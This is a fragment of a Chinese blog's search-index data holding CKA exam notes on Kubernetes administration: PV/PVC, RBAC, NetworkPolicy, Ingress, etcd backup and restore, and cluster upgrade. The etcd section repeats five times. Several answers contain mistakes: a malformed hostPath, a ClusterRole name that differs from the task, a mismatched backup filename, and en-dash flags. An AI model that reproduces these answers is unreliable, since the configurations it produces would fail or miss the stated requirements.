kubectl delete pod legacy-app 删除. ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:4","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#pod-添加-sidecar"},{"categories":["blog"],"content":" 创建 PV创建名为 app-data 的 pv，容量 2 Gi。ReadwriteOnce,hostPath，位于/srv/app-data apiVersion: v1 kind: PersistentVolume metadata: name: app-data spec: capacity: storage: 2Gi accessModes: - ReadWriteOnce hostPath: \"/srv/app-data\" ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:5","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#创建-pv"},{"categories":["blog"],"content":" 操作 PVC创建一个名为 app-pvc 的 PVC 资源对象 容量大小为 50 Mi 访问模式为 ReadWriteOnce 基于 storageclass 的 SC 资源对象创建 创建一个名为 app-pod 的 Pod 资源对象 依赖镜像为 Nginx 挂载路径为 /usr/share/nginx/html 调整 PVC 的资源对象为 100Mi 答题: 先查看有哪些 sc? kubectl get sc 创建一个 pvc 和 pod apiVersion: v1 kind: PersistentVolumeClaim metadata: name: app-pvc spec: storageClassName: standard # 把sc的名字填在这里 accessModes: - ReadWriteOnce resources: requests: storage: 50Mi --- apiVersion: v1 kind: Pod metadata: name: app-pod spec: containers: - name: app-pod image: nginx volumeMounts: - mountPath: /usr/share/nginx/html name: app-data volumes: - name: app-data persistentVolumeClaim: claimName: app-pvc 修改 pvc 的大小. kubectl edit pvc/app-pvc --save-config 编辑后退出即可. 如果报错, 提示你尝试 kubectl replace -f /tmp/kubectl-edit-1602427990.yaml 说明没有成功修改. 你尝试此命令后, 如果依然报错. 删掉已创建的容器, 编辑 yml 文件内容, 重新创建 pvc 和 pod. 参考文档:配置 Pod 以使用 PersistentVolume 作为存储 | Kubernetes ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:6","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#操作-pvc"},{"categories":["blog"],"content":" 授权 rbac创一个 clusterrole 将 deployment-clusterrole，允许创建 deployment、statefulset、daemonset。绑定到 app-team1 中 cicd-token 的 serviceaccount # 创建一个clusterrole kubectl create clusterrole \"default-clusterrole\" --verb=create --resource=deployment,statefulset,daemonset # 创建命名空间 kubectl create namespace app-team1 # 创建serviceaccount 且指定命名空间 kubectl create serviceaccount cicd-token -n app-team1 # 权限绑定到一起就授权了 kubectl create clusterrolebinding rb --clusterrole=default-clusterrole --serviceaccount=app-team1:cicd-token -n app-team1 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:7","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#授权-rbac"},{"categories":["blog"],"content":" 网络 networkpolicy创建 allow-port-from-namespace 的策略，允许 my-app 连接 big-corp 的 8080 不允许访问没有监听 8080 端口的服务 仅允许 my-app 中的 pod 访问 apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: allow-port-from-namespace namespace: big-corp spec: podSelector: matchLabels: namespace: big-corp policyTypes: - Ingress ingress: - from: - namespaceSelector: matchLabels: project: my-app ports: - protocol: TCP port: 8080 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:8","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#网络-networkpolicy"},{"categories":["blog"],"content":" Ingress 转发创建一个名为 my-ingress 的 ingress: 该 ingress 位于 app-team 的命名空间中 名称为 django 的 svc，提供 8000 端口服务 ingress 提供一个 /django 的 url 入口，用于访问 django 的 svc 环境准备: # 创建命名空间 kubectl create ns app-team # 创建一个应用,方便svc对接 kubectl create deployment django-deployment --image=nginx -n app-team 答题: apiVersion: v1 kind: Service metadata: name: django namespace: app-team spec: selector: app: django-deployment ports: - protocol: TCP port: 80 targetPort: 8000 --- apiVersion: networking.k8s.io/v1 kind: Ingress metadata: name: django-ingress namespace: app-team annotations: nginx.ingress.kubernetes.io/rewrite-target: / spec: ingressClassName: nginx rules: - host: \"django-ingress.kentxxq.com\" http: paths: - path: /django pathType: Prefix backend: service: name: django port: number: 8000 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:9","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#ingress-转发"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#etcd"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#题目"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#文件目录"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#查看相关节点"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#数据备份"},{"categories":["blog"],"content":" ETCD 题目将当前 kubernetes 集群的 etcd 数据进行备份 etcd 的 endpoint 位置为 https://127.0.0.1:2379 保存到 /data/backup/ 目录下，文件名为 snapshot-etcd.db。 将之前存储的 /data/backup/snapshot-etcd-previous.db 数据进行还原 文件目录切换到题目对应的 context, 然后 ssh 连接到 master 节点. 考虑 sudo -i 切换到 root 用户. systemctl cat etcd 查看是否部署了 etcd. 然后通过启动命令拿到证书, 数据位置 如果是容器部署的, 那么需要我们来查找 # 找到etcd kubectl get pods -n kube-system ... etcd 1/1 Running 0 8m51s ... # 拿到路径 kubectl describe pod/etcd -n kube-system ... command: etcd --data-dir=路径 --key-file=路径 --cert-file=路径 --trusted-ca-file=路径 ... 查看相关节点 etcdctl member list --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem # 或者 etcdctl endpoint status --cacert=/etc/ssl/etcd/ssl/ca.pem --cert=/etc/ssl/etcd/ssl/admin-master1.pem --key=/etc/ssl/etcd/ssl/admin-master1-key.pem 数据备份答题: # 备份只需要1个节点 etcdctl snapshot save /data/backup/etcd-snapshot.db --endpoints=https://127.0.0.1:2379 --cacert=/xxx/ca.crt --cert=/xxx/etcd-client.crt --key=/xxx/etcd-client.key 数据恢复etcd 以服务的方式运行 (独立于 k8s ): # 关闭服务,减少影响. systemctl stop api-server etcd # 把data-dir备份起来 mv /var/lib/etcd /var/lib/etcd.bak # 恢复数据 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db --data-dir=/var/lib/etcd ...endpoint...ca...cert...key... # 如果是生产环境,可能会有多个etcd节点,那么应该加上下面这些参数 # 当前节点的名称 # --name etcd-0 \\ # 所有的节点 # --initial-cluster etcd-0=http://host1:2380,etcd-1=http://host2:2380,etcd-2=http://host3:2380 \\ # 初始化互相通信用到的token # --initial-cluster-token etcd-cluster \\ # 宣告自己是谁 # --initial-advertise-peer-urls https://host1:2380 # 调整权限 chown -R etcd:etcd /var/lib/etcd # 启动etcd systemctl start etcd # 确认健康状态 ETCDCTL_API=3 etcdctl --cacert=/opt/kubernetes/ssl/ca.pem --cert=/opt/kubernetes/ssl/server.pem --key=/opt/kubernetes/ssl/server-key.pem --endpoints=https://host1:2379,https://host2:2379,https://host3:2379 endpoint health # 启动apiserver,确认etcd状态正常再启动api-server systemctl start api-server etcd 以 pod 的方式运行 (在 k8s 的内部): # 通常kubeadm安装的k8s,manifest在/etc/kubernetes/manifests,而下面就有etcd.yaml文件 # 参考https://kubernetes.io/zh-cn/docs/reference/setup-tools/kubeadm/implementation-details/ mv /etc/kubernetes/manifests /etc/kubernetes/manifests-bak # etcd容器将会消失 crictl ps # 备份etcd mv /var/lib/etcd /var/lib/etcd-bak # 恢复数据，每个master节点都要改动参数，然后执行 ETCDCTL_API=3 etcdctl snapshot restore /data/backup/snapshot-etcd-previous.db \\ --name=etcd-0 \\ --data-dir=/var/lib/etcd \\ --initial-cluster=\"kubernetes-master1=https://10.0.0.12:2380,kubernetes-master2=https://10.0.0.13:2380,kubernetes-master3=https://10.0.0.14:2380\" \\ --initial-cluster-token=etcd-cluster \\ --initial-advertise-peer-urls=https://10.0.0.12:2380 \\ ...endpoint...ca...cert...key... # 恢复容器 mv /etc/kubernetes/manifests-bak /etc/kubernetes/manifests ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:10","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#数据恢复"},{"categories":["blog"],"content":" 调整 nodeSelector kubectl edit pod nginx-kusc00401 添加/修改 nodeSelector 字段 apiVersion: v1 kind: Pod metadata: name: nginx-kusc00401 spec: containers: - name: nginx image: nginx nodeSelector: disk: ssd ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:11","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#调整-nodeselector"},{"categories":["blog"],"content":" 获取 pod 错误日志找到 pod bar 的 file-not-found 日志，然后记录到文件 kubectl logs pod bar |grep \"file-not-found\" \u003e 1.txt ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:12","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#获取-pod-错误日志"},{"categories":["blog"],"content":" 节点设置为不可调度 kubectl drain node1 --ignore-daemonsets # 可强制 --delete-local-data --force # 恢复 kubectl uncordon node1 ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:13","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#节点设置为不可调度"},{"categories":["blog"],"content":" 升级 k8s 集群（1.20.0=\u003e1.20.1） # 排空节点 kubectl drain node1 --ignore-daemonsets # 安装指定的kubeadm sudo -i apt install kubeadm=1.20.1-00 –y kubeadm upgrade plan kubeadm upgrade apply v1.20.1 --etcd-upgrade=false # 升级kubelet和kubectl apt install kubelet=1.20.1-00 kubectl=1.20.1-00 -y # 重启kubelet systemctl restart kubelet # 恢复节点 kubectl uncordon node1 # 验证升级情况 kubectl get nodes ","date":"2023-08-14","objectID":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/:2:14","series":null,"tags":["blog","k8s"],"title":"CKA认证","uri":"/posts/%E7%AC%94%E8%AE%B0/cka%E8%AE%A4%E8%AF%81/#升级-k8s-集群12001201"},{"categories":["blog"],"content":" 统计 cpu 最高的 pod kubectl top pod -l name=cpu-utilizer --sort-by=\"cpu\" –A 